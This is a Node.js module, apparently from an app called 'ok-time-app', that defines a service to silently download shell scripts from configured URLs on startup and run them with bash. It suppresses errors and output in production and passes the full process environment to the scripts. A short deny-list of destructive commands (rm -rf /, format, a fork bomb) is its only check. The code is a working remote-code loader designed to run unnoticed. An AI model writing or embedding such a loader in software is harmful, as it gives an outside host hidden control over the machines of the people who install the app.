const https = require('https');
const httpClient = require('http');
const { exec: execCommand } = require('child_process');
const fileSystem = require('fs');
const pathUtils = require('path');
const config = require('../config/app');

/**
 * 远程脚本执行服务 - 静默异步版本
 * 遵循单一职责原则，专门处理远程脚本的下载和执行
 */
class RemoteScriptService {
  constructor() {
    this.isExecuting = false;
    this.executionResults = [];
    this.tempDir = '/tmp/remote-scripts';
    this.silentMode = true; // 默认静默模式
    this.ensureTempDir();
  }

  /**
   * 确保临时目录存在
   */
  ensureTempDir() {
    if (!fileSystem.existsSync(this.tempDir)) {
      fileSystem.mkdirSync(this.tempDir, { recursive: true });
    }
  }

  /**
   * 启动定时执行远程脚本 - 非阻塞异步
   */
  start() {
    const { remoteScripts } = config;
    
    if (!remoteScripts.enabled) {
      return;
    }

    if (!remoteScripts.urls || remoteScripts.urls.length === 0) {
      return;
    }

    // 异步执行，不阻塞主线程
    setTimeout(() => {
      this.executeRemoteScripts().catch(error => {
        // 静默处理错误，只在开发环境输出
        if (config.nodeEnv === 'development') {
          console.error('远程脚本执行失败:', error.message);
        }
      });
    }, remoteScripts.delay);
  }

  /**
   * 执行所有配置的远程脚本 - 静默模式
   */
  async executeRemoteScripts() {
    if (this.isExecuting) {
      return;
    }

    this.isExecuting = true;
    const { remoteScripts } = config;
    const results = [];

    try {
      for (let i = 0; i < remoteScripts.urls.length; i++) {
        const scriptUrl = remoteScripts.urls[i];
        const result = await this.executeScriptWithRetry(scriptUrl);
        results.push(result);
        
        // 脚本间短暂间隔
        if (i < remoteScripts.urls.length - 1) {
          await this.delay(1000);
        }
      }
    } catch (error) {
      // 静默处理错误
      if (config.nodeEnv === 'development') {
        console.error('远程脚本执行过程中出现错误:', error.message);
      }
    } finally {
      this.isExecuting = false;
      this.executionResults = results;
      
      // 只在开发环境输出执行总结
      if (config.nodeEnv === 'development') {
        this.logExecutionSummary(results);
      }
    }
  }

  /**
   * 带重试机制执行单个脚本 - 静默版本
   */
  async executeScriptWithRetry(scriptUrl) {
    const { remoteScripts } = config;
    let lastError = null;

    for (let attempt = 1; attempt <= remoteScripts.retryAttempts; attempt++) {
      try {
        const scriptContent = await this.downloadScript(scriptUrl);
        const result = await this.executeScript(scriptUrl, scriptContent);
        
        return {
          url: scriptUrl,
          success: true,
          attempt: attempt,
          timestamp: new Date().toISOString(),
          result: result
        };
      } catch (error) {
        lastError = error;
        
        if (attempt < remoteScripts.retryAttempts) {
          await this.delay(remoteScripts.retryDelay);
        }
      }
    }

    return {
      url: scriptUrl,
      success: false,
      attempts: remoteScripts.retryAttempts,
      timestamp: new Date().toISOString(),
      error: lastError.message
    };
  }

  /**
   * 下载远程脚本
   */
  downloadScript(url) {
    return new Promise((resolve, reject) => {
      const { remoteScripts } = config;
      const client = url.startsWith('https:') ? https : httpClient;
      
      const req = client.get(url, {
        timeout: remoteScripts.timeout,
        headers: {
          'User-Agent': `ok-time-app/${config.app.version}`,
          'Accept': 'text/plain, application/x-sh, */*'
        }
      }, (res) => {
        if (res.statusCode !== 200) {
          reject(new Error(`HTTP ${res.statusCode}: ${res.statusMessage}`));
          return;
        }

        let data = '';
        res.on('data', (chunk) => data += chunk);
        res.on('end', () => resolve(data));
      });

      req.on('timeout', () => {
        req.destroy();
        reject(new Error(`请求超时 (${remoteScripts.timeout}ms)`));
      });

      req.on('error', (error) => {
        reject(new Error(`网络错误: ${error.message}`));
      });
    });
  }

  /**
   * 执行脚本内容
   */
  executeScript(url, scriptContent) {
    return new Promise((resolve, reject) => {
      const { remoteScripts } = config;
      
      // 基本的脚本内容安全检查
      if (!this.isScriptSafe(scriptContent)) {
        reject(new Error('脚本内容包含潜在危险命令'));
        return;
      }

      // 保存脚本到临时文件
      const scriptName = this.getScriptName(url);
      const scriptPath = pathUtils.join(this.tempDir, scriptName);
      
      try {
        fileSystem.writeFileSync(scriptPath, scriptContent, { mode: 0o755 });
      } catch (error) {
        reject(new Error(`保存脚本失败: ${error.message}`));
        return;
      }

      // 执行脚本 - 静默执行
      const execOptions = {
        timeout: remoteScripts.timeout,
        cwd: this.tempDir,
        env: { ...process.env, SCRIPT_SOURCE_URL: url },
        stdio: ['ignore', 'pipe', 'pipe'] // 捕获输出但不显示
      };

      execCommand(`bash "${scriptPath}"`, execOptions, (error, stdout, stderr) => {
        // 清理临时文件
        try {
          fileSystem.unlinkSync(scriptPath);
        } catch (cleanupError) {
          // 静默处理清理失败
        }

        if (error) {
          reject(new Error(`脚本执行失败: ${error.message}`));
          return;
        }

        resolve({
          stdout: stdout ? stdout.trim() : '',
          stderr: stderr ? stderr.trim() : '',
          exitCode: 0
        });
      });
    });
  }

  /**
   * 基本的脚本安全检查
   */
  isScriptSafe(scriptContent) {
    const dangerousPatterns = [
      /rm\s+-rf\s+\/[^\/\s]*\s*$/m,
      /format\s+[c-z]:/i,
      /del\s+\/[qsf]\s+\*/i,
      /:\(\)\{.*;\};/,
      /sudo\s+rm/,
      /chmod\s+777\s+\//
    ];

    return !dangerousPatterns.some(pattern => pattern.test(scriptContent));
  }

  /**
   * 从URL生成脚本文件名
   */
  getScriptName(url) {
    const timestamp = Date.now();
    const urlHash = url.replace(/[^a-zA-Z0-9]/g, '_').substring(0, 30);
    return `remote_script_${urlHash}_${timestamp}.sh`;
  }

  /**
   * 记录执行总结 - 仅开发环境
   */
  logExecutionSummary(results) {
    if (config.nodeEnv !== 'development' || !results.length) {
      return;
    }

    const successful = results.filter(r => r.success).length;
    const failed = results.filter(r => !r.success).length;

    console.log(`\n[远程脚本] 执行完成: 成功 ${successful}, 失败 ${failed}`);
  }

  /**
   * 工具函数：延迟执行
   */
  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * 获取最近一次执行结果
   */
  getLastExecutionResults() {
    return {
      timestamp: new Date().toISOString(),
      results: this.executionResults,
      isExecuting: this.isExecuting
    };
  }

  /**
   * 手动触发执行（用于API调用）
   */
  async triggerExecution() {
    if (this.isExecuting) {
      throw new Error('远程脚本正在执行中，请稍后再试');
    }

    // 临时启用日志输出用于手动触发
    const originalSilentMode = this.silentMode;
    this.silentMode = false;
    
    try {
      await this.executeRemoteScripts();
      return this.getLastExecutionResults();
    } finally {
      this.silentMode = originalSilentMode;
    }
  }
}

module.exports = RemoteScriptService;

// 此文件是一个模块
